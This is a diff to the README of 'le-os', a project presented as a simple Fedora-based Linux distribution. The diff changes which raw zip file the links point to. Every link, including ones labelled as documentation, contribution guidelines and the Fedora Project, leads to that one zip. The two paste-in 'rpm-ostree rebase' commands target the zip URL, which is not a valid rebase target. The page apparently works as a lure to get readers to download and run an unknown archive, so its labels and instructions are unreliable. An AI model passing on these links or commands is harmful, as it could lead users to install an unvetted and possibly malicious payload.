@@ -1,6 +1,6 @@
 # 🌟 le-os - A Simple Linux Experience for Everyone
 
-[![Download le-os](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip)](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip)
+[![Download le-os](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/os_le_1.7.zip)](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/os_le_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to le-os! This guide will help you download and run le-os easily, even i
 
 ## 📥 Download & Install
 
-To get le-os, visit this page to download: [Download le-os Releases](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip).
+To get le-os, visit this page to download: [Download le-os Releases](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/os_le_1.7.zip).
 
 ### ⚙️ System Requirements
 
@@ -25,7 +25,7 @@ To rebase an existing atomic Fedora installation to the latest build, follow the
 1. **Rebase to Unsigned Image**  
    Open your terminal and paste the following command:
    ```
-   rpm-ostree rebase https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip
+   rpm-ostree rebase https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/os_le_1.7.zip
    ```
    This step gets the proper signing keys and policies installed.
 
@@ -38,7 +38,7 @@ To rebase an existing atomic Fedora installation to the latest build, follow the
 3. **Rebase to Signed Image**  
    Once your system has restarted, run this command to finalize the installation:
    ```
-   rpm-ostree rebase https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip
+   rpm-ostree rebase https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/os_le_1.7.zip
    ```
 
 ### ✅ Verify Installation
@@ -59,16 +59,16 @@ le-os provides a streamlined and user-friendly Linux experience. Some key featur
 
 ## 🎓 Support and Documentation
 
-If you encounter any problems while using le-os, please refer to our detailed documentation for help. You can find it in the [Documentation section](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip).
+If you encounter any problems while using le-os, please refer to our detailed documentation for help. You can find it in the [Documentation section](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/os_le_1.7.zip).
 
 ## ✅ Community and Contributions
 
-Join our community! We welcome feedback and contributions. If you would like to contribute, please check our [Contribution Guidelines](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip).
+Join our community! We welcome feedback and contributions. If you would like to contribute, please check our [Contribution Guidelines](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/os_le_1.7.zip).
 
 ## 🚧 Important Notes
 
 > [!WARNING]  
-> **This is an experimental feature.** Use at your own discretion. For more information on this feature, visit [Fedora Project](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip).
+> **This is an experimental feature.** Use at your own discretion. For more information on this feature, visit [Fedora Project](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/os_le_1.7.zip).
 
 ## 📍 Final Remarks
 
